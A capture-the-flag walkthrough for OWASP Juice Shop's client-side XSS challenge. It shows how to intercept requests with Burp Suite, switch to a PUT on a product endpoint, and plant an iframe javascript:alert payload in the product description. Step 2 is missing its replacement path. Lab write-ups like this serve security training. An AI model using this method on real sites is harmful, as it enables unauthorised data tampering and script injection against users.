#  Client-side XSS Protection — OWASP Juice Shop

##  Challenge Summary
This challenge demonstrates how client-side Cross-Site Scripting (XSS) vulnerabilities can occur when user-controlled input is not properly sanitized before being displayed on a web page.

---

##  Solution Steps

1. **Login to OWASP Juice Shop**  
   Open **Burp Suite** and turn on **Intercept**.  
   Continue clicking **Forward** until you see the following request:
GET /api/Challenges/?name=Score%20Board HTTP/1.1

2. **Modify the request path**  
Remove the part:
?name=Score%20Board
Replace it with:
This retrieves all product details.

3. **Access a specific product**  
Use a product ID to fetch details. Example:
GET /api/Products/6 HTTP/1.1
In this case, product ID `6` corresponds to **Banana Juice**.

4. **Copy and modify the response**  
From the **response**, copy the `description` field content and use it in your **request** body.  
Remove all other keys like `status`, `data`, `id`, `price`, etc., keeping only the description field:  
```json
{"description": "Monkey loves it the most"}

5. **Inject a payload (for testing XSS)**
Replace the description value with:
{"description": "<iframe src=\"javascript:alert(`xss`)\"> "}

6. **Change the request method**
Replace GET with PUT:
PUT /api/Products/6 HTTP/1.1

7. **Add a Content-Type header**
Insert the following header between Accept-Language and Accept-Encoding:
Content-Type: application/json

8. **Send the request**
Click Send.
The response should now show:
{"description": "<iframe src=\"javascript:alert(`xss`)\"> "}
If the change reflects in the product description, the Client-side XSS challenge is solved!